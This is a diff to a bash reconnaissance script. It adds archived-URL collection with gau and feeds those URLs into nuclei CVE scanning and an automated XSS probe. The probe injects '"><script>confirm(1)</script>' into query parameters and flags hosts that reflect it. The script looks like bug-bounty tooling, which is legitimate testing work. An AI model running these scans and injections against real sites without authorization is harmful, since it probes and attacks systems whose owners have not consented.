@@ -55,14 +55,17 @@ cat $url/final.txt | httpx -silent >> $url/lives.txt
 echo -e "${GREEN}[+] Lives and more subdomains...${ENDCOLOR}"
 cat $url/final.txt | httpx --status-code --content-length -title -verbose  >> $url/vivos.txt
 
-echo -e "${GREEN}[+] nuclei scan...${ENDCOLOR}"
+echo -e "${GREEN}[+] All urls lives...${ENDCOLOR}"
+cat $url/lives.txt | gau --subs | httpx -silent | tee -a $url/allurls.txt
+
+echo -e "${GREEN}[+] nuclei scan all outputs...${ENDCOLOR}"
 nuclei -l $url/lives.txt -t ~/nuclei-templates -es info | tee -a $url/nuclei.txt
 shodan domain $url | awk '{print $3}' | httpx -silent | nuclei -t ~/nuclei-templates -es info | tee -a $url/nuclei.txt 
 nuclei -l $url/aqua_$url/aquatone_urls.txt -t ~/nuclei-templates -es info | tee -a $url/nuclei.txt 
 nuclei -l $url/aqua_$url -t cves | tee -a $url/nuclei.txt
 
 echo -e "${GREEN}[+] Scan xss...${ENDCOLOR}"
-cat $url/lives.txt | gau --subs | tee -a $url/archivo.txt | grep "=" | egrep -iv ".(jpg|peg|gif|css|tif|tiff|png|woff|woff2|ico|pdf|svg|txt|js)" | qsreplace '"><script>confirm(1)</script>'| tee -a $url/arch.json && cat $url/arch.json | while read host do; do curl --silent --path-as-is --insecure "$host" | grep -qs "<script>confirm(1)" && echo "$host \033[0;031mVulnerable\n" | tee -a $url/xss_vulnerables.txt;done
+cat $url/allurls.txt | tee -a $url/archivo.txt | grep "=" | egrep -iv ".(jpg|peg|gif|css|tif|tiff|png|woff|woff2|ico|pdf|svg|txt|js)" | qsreplace '"><script>confirm(1)</script>'| tee -a $url/arch.json && cat $url/arch.json | while read host do; do curl --silent --path-as-is --insecure "$host" | grep -qs "<script>confirm(1)" && echo "$host \033[0;031mVulnerable\n" | tee -a $url/xss_vulnerables.txt;done
 rm $url/archivo.txt
 rm $url/arch.json
 
